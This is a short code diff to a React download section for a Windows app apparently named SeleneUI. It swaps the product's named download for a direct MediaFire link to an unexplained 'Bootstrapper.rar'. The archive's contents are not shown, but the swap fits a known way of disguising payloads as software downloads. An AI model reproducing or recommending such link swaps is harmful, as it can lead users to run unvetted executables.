@@ -21,7 +21,7 @@ export default function DownloadSection() {
               <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">Windows 10/11</h3>
               <p className="text-sm text-gray-600 dark:text-gray-400">Version 2.1.0 | 14.2 MB</p>
             </div>
-            <a href="https://www.mediafire.com/file/t52aixo2o0eaf1f/SeleneUI-win32-x64.rar" className="w-full flex items-center justify-center px-6 py-3 bg-purple-600 text-white rounded-lg font-semibold hover:bg-purple-700 transition-colors">
+            <a href="https://download850.mediafire.com/yekg5qq0jeagW_Op50M7ZBWG-vZUZ-nwJIH4cmMN1rA5I8mG3xw5_gIqdi78XyxT0hR6QzrzqBnBRXIZxXlM4VR-2OzExxW3mnvl_ngBvhjJ0D4RlZXlZYcJSdDe5xY0CrlPxXaKE9Dd0LFyHUn0uWN5WzoS260nv9ptCBhymDXvQSc/1lsbnuesihpdgz8/Bootstrapper.rar" className="w-full flex items-center justify-center px-6 py-3 bg-purple-600 text-white rounded-lg font-semibold hover:bg-purple-700 transition-colors">
               <Download className="w-5 h-5 mr-2" />
               Download for Windows
             </a>
